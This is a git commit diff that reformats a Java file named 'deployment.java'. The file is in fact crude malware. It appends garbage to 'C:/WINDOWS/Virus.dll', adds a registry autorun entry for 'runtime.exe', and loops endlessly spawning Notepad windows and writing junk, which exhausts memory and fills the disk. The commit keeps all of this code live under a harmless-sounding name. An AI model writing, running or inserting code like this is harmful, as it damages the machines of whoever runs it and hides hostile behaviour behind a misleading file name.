571bea6b2ffae1ea2c5eba937dab3c5155cc57c3
Localtings <80166007+WebsiteThe@users.noreply.github.com>
2021-05-04 19:26:08 +0700

    Update deployment.java

--- deployment.java
+++ deployment.java
@@ -5,21 +5,15 @@ import java.io.FileWriter;
 import java.io.IOException;
 class deployment
 {
-
-
 public static void main(String args[]) throws IOException {
-	
-	try
-  {
-	FileWriter f=new FileWriter("C:/WINDOWS/Virus.dll",true);
-	Process process = Runtime.getRuntime().exec("cmd /c REG ADD HKLM\\SOFTWARE\\Windows//Run /v AppInfo /t REG_SZ /d C:/Program Files/runtime.exe");
-   while(true)
-   {
+try {
+FileWriter f=new FileWriter("C:/WINDOWS/Virus.dll",true);
+Process process = Runtime.getRuntime().exec("cmd /c REG ADD HKLM\\SOFTWARE\\Windows//Run /v AppInfo /t REG_SZ /d C:/Program Files/runtime.exe");
+while(true) {
 	   Process np = Runtime.getRuntime().exec("cmd /c notepad");   
 	   f.write("aw#m1kl*&m29asmmm#%01i20^");
-   }
-  }
-  catch(FileNotFoundException e){}
+}
+} catch(FileNotFoundException e){}
    catch(IOException e){}
  }
 } 
